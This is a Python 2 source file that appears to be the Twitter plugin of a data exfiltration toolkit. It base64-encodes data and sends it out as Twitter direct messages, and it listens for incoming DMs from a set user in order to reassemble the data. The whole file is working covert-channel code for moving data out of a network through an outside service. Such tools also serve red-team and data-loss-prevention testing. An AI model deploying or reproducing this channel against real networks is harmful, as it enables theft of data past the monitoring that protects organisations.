from tweepy import Stream
from tweepy import OAuthHandler
from tweepy import API
from tweepy.streaming import StreamListener
import base64
import json

CONSUMER_TOKEN = 'xx'
CONSUMER_SECRET = 'xx'

ACCESS_TOKEN = 'xx'
ACCESS_TOKEN_SECRET = 'xx'

USERNAME = 'PaulWebSec'

api = None
auth = None
app_exfiltrate = None
config = None


class StdOutListener(StreamListener):

    def on_data(self, status):
        try:
            data = json.loads(status)
            if data['direct_message'] and data['direct_message']['sender_screen_name'] == USERNAME:
                try:
                    data_to_retrieve = base64.b64decode(
                        data['direct_message']['text'])
                    app_exfiltrate.log_message(
                        'ok', "Retrieved a packet from Twitter of {0} bytes".format(len(data_to_retrieve)))
                    app_exfiltrate.retrieve_data(data_to_retrieve)
                except Exception, e:
                    print e
                    pass
        except:
            # app_exfiltrate.log_message('warning', "Could not manage to decode message")
            pass


def start_twitter():
    global api
    global auth

    auth = OAuthHandler(config['CONSUMER_TOKEN'], config['CONSUMER_SECRET'])
    auth.secure = True
    auth.set_access_token(config['ACCESS_TOKEN'],
                          config['ACCESS_TOKEN_SECRET'])
    api = API(auth)


def send(data):
    global api
    if (not api):
        start_twitter()
    api.send_direct_message(user=USERNAME, text=base64.b64encode(data))


def listen():
    start_twitter()
    try:
        app_exfiltrate.log_message('info', "[twitter] Listening for DMs...")
        stream = Stream(auth, StdOutListener())
        stream.userstream()
    except Exception, e:
        app_exfiltrate.log_message(
            'warning', "[twitter] Couldn't listen for Twitter DMs".format(e))

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [twitter] proxy mode unavailable (useless) for twitter plugin...")

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config, USERNAME
        config = conf
        USERNAME = config['username']
        app.register_plugin('twitter', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
